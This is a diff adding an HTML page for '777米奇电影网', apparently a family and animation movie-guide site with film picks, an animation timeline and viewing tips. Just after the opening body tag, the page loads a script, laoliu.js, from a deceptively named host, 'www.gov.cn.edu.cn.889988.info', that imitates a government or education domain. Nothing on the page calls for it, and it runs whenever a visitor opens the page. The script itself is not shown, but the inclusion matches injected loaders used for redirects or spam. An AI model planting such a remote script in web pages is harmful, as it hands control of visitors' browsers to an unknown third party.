@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>777米奇电影网 - 动画、合家欢、奇幻与亲子观影导航</title>
+<meta name="description" content="777米奇电影网（777miqidianyingwang-h5）是卡通合家欢式影视导航：动画电影、奇幻大片、亲子片单、吉卜力与皮克斯风格片库、家庭观影场景一网打尽。官方网址：https://777miqidianyingwang-h5.github.io">
+<meta name="keywords" content="777米奇电影网, 777miqidianyingwang-h5, 米奇电影, 动画电影, 合家欢, 亲子电影, 奇幻电影, 吉卜力">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#0c0a12;color:#fdeef4;line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(780px 360px at 12% 8%, rgba(255,210,32,.14), transparent 55%),
+    radial-gradient(720px 340px at 88% 92%, rgba(74,144,255,.14), transparent 55%),
+    #0c0a12;
+}
+.mk-nav{
+  position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;
+  padding:12px 20px;background:rgba(12,10,18,.86);backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(255,210,32,.25);
+}
+.mk-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.mk-nav .logo b{color:#ffd220}
+.mk-nav .logo i{color:#ff5b6e;font-style:normal}
+.mk-nav .logo u{color:#5aa0ff;text-decoration:none}
+.mk-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.mk-nav .links a{font-size:13px;color:#f3c9da;padding:6px 12px;border-radius:20px;transition:.25s}
+.mk-nav .links a:hover{background:rgba(255,210,32,.14);color:#ffd220}
+
+.hero{padding:60px 20px 44px;text-align:center}
+.ears{width:84px;height:84px;margin:0 auto 14px;position:relative}
+.ears::before,.ears::after{content:"";position:absolute;top:-18px;width:34px;height:34px;border-radius:50%;background:#ff5b6e;border:4px solid #0c0a12}
+.ears::before{left:2px}
+.ears::after{right:2px}
+.ears .face{position:absolute;inset:0;border-radius:50%;background:#ffd220;border:4px solid #0c0a12}
+.lucky{font-size:56px;font-weight:900;letter-spacing:6px;
+  background:linear-gradient(135deg,#ff5b6e,#ffd220,#5aa0ff);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero h1{font-size:30px;color:#fff;margin:6px 0 12px}
+.hero h1 b{color:#ffd220}
+.hero p{color:#f3c9da;max-width:600px;margin:0 auto 18px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#1a1206;font-weight:800;background:#ffd220;padding:8px 18px;border-radius:30px}
+.popcorn{width:200px;height:10px;border-radius:20px;background:#241a2b;overflow:hidden;margin:20px auto 0}
+.popcorn i{display:block;height:100%;width:68%;background:linear-gradient(90deg,#ffd220,#ff8a3c)}
+
+.wrap{max-width:1160px;margin:0 auto;padding:62px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#caa6b8;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#fff;margin-bottom:28px}
+.sec-title b{color:#ffd220}
+
+/* 合家欢片单 */
+.fam{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.fam-card{background:#140f1c;border:1px solid rgba(255,210,32,.18);border-radius:16px;overflow:hidden;transition:.3s}
+.fam-card:hover{transform:translateY(-4px);border-color:#ffd220;box-shadow:0 18px 40px rgba(255,210,32,.1)}
+.fam-card .cv{height:128px;position:relative}
+.fam-card .cv.a{background:linear-gradient(135deg,#3a0d22,#ff5b6e)}
+.fam-card .cv.b{background:linear-gradient(135deg,#10243a,#5aa0ff)}
+.fam-card .cv.c{background:linear-gradient(135deg,#332400,#ffd220)}
+.fam-card .cv.d{background:linear-gradient(135deg,#103026,#5be0a0)}
+.fam-card .cv .age{position:absolute;left:12px;bottom:12px;font-size:11px;font-weight:800;color:#1a1206;background:#ffd220;padding:3px 10px;border-radius:20px}
+.fam-card .cv .star{position:absolute;right:12px;top:12px;font-size:12px;color:#1a1206;background:#ff8a3c;padding:3px 9px;border-radius:20px;font-weight:800}
+.fam-card .body{padding:16px 18px}
+.fam-card .body h4{color:#fff;font-size:16px;margin-bottom:4px}
+.fam-card .body .meta{font-size:12px;color:#caa6b8;margin-bottom:8px}
+.fam-card .body p{font-size:13px;color:#f3c9da;margin:0}
+
+/* 动画时间线 */
+.toon-line{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.toon{background:#140f1c;border:1px solid rgba(90,160,255,.22);border-radius:14px;padding:20px;position:relative}
+.toon .era{font-size:12px;color:#5aa0ff;font-weight:800;letter-spacing:1px}
+.toon h4{color:#fff;font-size:16px;margin:6px 0 6px}
+.toon p{color:#caa6b8;font-size:13px;margin:0}
+.toon .dot{position:absolute;top:20px;right:18px;width:10px;height:10px;border-radius:50%;background:#ffd220;box-shadow:0 0 12px #ffd220}
+
+/* 亲子场景 */
+.scene2{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.sc-card{background:#120d18;border:1px solid rgba(255,91,110,.22);border-radius:14px;padding:22px}
+.sc-card .emo{font-size:28px;margin-bottom:8px}
+.sc-card h4{color:#fff;font-size:16px;margin-bottom:6px}
+.sc-card p{color:#f3c9da;font-size:13px;margin:0}
+.sc-card .when{display:inline-block;margin-top:10px;font-size:11px;color:#1a1206;background:#ffd220;padding:3px 10px;border-radius:20px;font-weight:700}
+
+/* 米奇守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.rule{background:#140f1c;border-left:4px solid #ff5b6e;border-radius:12px;padding:20px}
+.rule h4{color:#fff;font-size:16px;margin-bottom:6px}
+.rule p{color:#caa6b8;font-size:13px;margin:0}
+
+.about{border:1px solid rgba(255,210,32,.22);border-radius:16px;padding:32px;
+  background:linear-gradient(135deg,rgba(255,210,32,.08),rgba(90,160,255,.07));
+  display:flex;gap:28px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#fff;font-size:22px;margin-bottom:10px}
+.about h2 b{color:#ffd220}
+.about p{color:#f3c9da;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:24px;flex-wrap:wrap}
+.about .stats .n{font-size:28px;font-weight:900;color:#ff8a3c}
+.about .stats .l{font-size:11px;color:#caa6b8}
+
+.foot{text-align:center;padding:36px 20px;background:#070509;border-top:1px solid rgba(255,210,32,.15);color:#8a7287;font-size:13px}
+.foot a{color:#ffd220}
+.foot .lg{font-size:18px;font-weight:900;color:#fdeef4;margin-bottom:8px}
+
+@media(max-width:640px){
+  .lucky{font-size:40px}
+  .hero h1{font-size:25px}
+  .mk-nav .links a{font-size:12px;padding:5px 9px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="mk-nav">
+  <div class="logo"><b>777</b><i>米奇</i><u>电影网</u></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#fam">合家欢</a>
+    <a href="#toon">动画时间线</a>
+    <a href="#scene">亲子场景</a>
+    <a href="#rules">米奇守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="ears"><div class="face"></div></div>
+  <div class="lucky">777</div>
+  <h1>777米奇电影网：<b>一家子</b>一起看才好看</h1>
+  <p>动画电影、奇幻冒险、吉卜力、皮克斯风、亲子短片、节日合家欢——像米奇戴上耳机，把“大人也爱看、小孩看不懂也笑”的片子排成幸运转轮。</p>
+  <span class="url">🌐 https://777miqidianyingwang-h5.github.io</span>
+  <div class="popcorn"><i></i></div>
+  <p style="font-size:12px;color:#caa6b8;margin-top:8px">爆米花进度 68% · 片单已热好</p>
+</header>
+
+<section id="fam" class="wrap">
+  <div class="kicker">FAMILY PICKS</div>
+  <h2 class="sec-title">合家欢 <b>片单</b></h2>
+  <div class="fam">
+    <div class="fam-card"><div class="cv a"><span class="age">全龄</span><span class="star">9.4</span></div><div class="body"><h4>千与千寻</h4><div class="meta">2001 · 日本 · 奇幻/成长</div><p>澡堂、神明、名字与勇气，吉卜力合家欢天花板。</p></div></div>
+    <div class="fam-card"><div class="cv b"><span class="age">6+</span><span class="star">9.1</span></div><div class="body"><h4>飞屋环游记</h4><div class="meta">2009 · 皮克斯 · 冒险</div><p>房子飞起来，老人和小孩一起去还一个承诺。</p></div></div>
+    <div class="fam-card"><div class="cv c"><span class="age">全龄</span><span class="star">8.7</span></div><div class="body"><h4>疯狂动物城</h4><div class="meta">2016 · 迪士尼 · 悬疑/合家欢</div><p>兔子警察和狐狸骗子，把偏见讲成侦探喜剧。</p></div></div>
+    <div class="fam-card"><div class="cv d"><span class="age">4+</span><span class="star">9.2</span></div><div class="body"><h4>龙猫</h4><div class="meta">1988 · 吉卜力 · 治愈</div><p>雨伞、公交猫、橡果子——童年该有的夏天。</p></div></div>
+  </div>
+</section>
+
+<section id="toon" class="wrap">
+  <div class="kicker">ANIMATION TIMELINE</div>
+  <h2 class="sec-title">动画 <b>时间线</b></h2>
+  <div class="toon-line">
+    <div class="toon"><span class="dot"></span><div class="era">1980s-1990s</div><h4>手绘黄金期</h4><p>龙猫、狮子王、美女与野兽：赛璐珞、音乐剧结构、家庭价值。</p></div>
+    <div class="toon"><span class="dot"></span><div class="era">2000s-2010s</div><h4>3D 合家欢</h4><p>玩具总动员、冰雪奇缘、寻梦环游记：技术升级，情绪更锋利。</p></div>
+    <div class="toon"><span class="dot"></span><div class="era">2010s-2020s</div><h4>吉卜力/新动画潮</h4><p>蜘蛛侠：纵横宇宙、葬送的芙莉莲、你的名字：青年向动画破圈。</p></div>
+    <div class="toon"><span class="dot"></span><div class="era">现在</div><h4>动画+短剧</h4><p>动态漫、国创修仙、儿童科普动画，通勤和睡前都能刷。</p></div>
+  </div>
+</section>
+
+<section id="scene" class="wrap">
+  <div class="kicker">FAMILY SCENES</div>
+  <h2 class="sec-title">什么场景，看什么卡通</h2>
+  <div class="scene2">
+    <div class="sc-card"><div class="emo">🛋️</div><h4>周末客厅</h4><p>大屏+合家欢：飞屋、疯狂动物城、机器人之梦。</p><span class="when">周六 15:00</span></div>
+    <div class="sc-card"><div class="emo">🛏️</div><h4>睡前治愈</h4><p>龙猫、海洋之歌、我的邻居山田君，别放恐怖动画。</p><span class="when">21:30</span></div>
+    <div class="sc-card"><div class="emo">🎂</div><h4>生日/节日</h4><p>欢乐满人间、旺卡、圣诞夜惊魂（大孩版）。</p><span class="when">节假日</span></div>
+    <div class="sc-card"><div class="emo">🧒</div><h4>带娃启蒙</h4><p>数字虫、蓝色小狗、科普动画、低龄绘本改编剧。</p><span class="when">放学后</span></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">MICKEY RULES</div>
+  <h2 class="sec-title">米奇放映 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rule"><h4>1. 合家欢先看分级</h4><p>4+、6+、10+、全龄分开，别让小孩误入暗黑动画。</p></div>
+    <div class="rule"><h4>2. 大人别嫌幼稚</h4><p>好动画都讲失去、时间、勇气——只是穿了卡通外套。</p></div>
+    <div class="rule"><h4>3. 不碰未授权资源</h4><p>本页只做片单、分级、场景导航，不提供盗版提取码。</p></div>
+    <div class="rule"><h4>4. 看完聊两句</h4><p>“你最喜欢谁 / 如果是你会怎么办”比打分更有用。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>777 米奇的 <b>幸运逻辑</b></h2>
+      <p>777 是连号好运，米奇是“所有人都能认出的快乐符号”。777米奇电影网不做暗黑聚合、不堆擦边标题，只把动画、奇幻、亲子、合家欢片单排整齐，让一家子少翻十分钟、多笑十分钟。</p>
+      <p>静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，适合 GitHub Pages 托管与必应收录。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">777</div><div class="l">幸运站号</div></div>
+      <div><div class="n">全龄+</div><div class="l">分级体系</div></div>
+      <div><div class="n">4</div><div class="l">亲子场景</div></div>
+      <div><div class="n">∞</div><div class="l">卡通片单</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">🐭 777米奇电影网</div>
+  官方网址：<a href="https://777miqidianyingwang-h5.github.io">https://777miqidianyingwang-h5.github.io</a><br>
+  © 2026 777米奇电影网｜动画 / 奇幻 / 合家欢 / 亲子观影导航
+</footer>
+
+</body>
+</html>
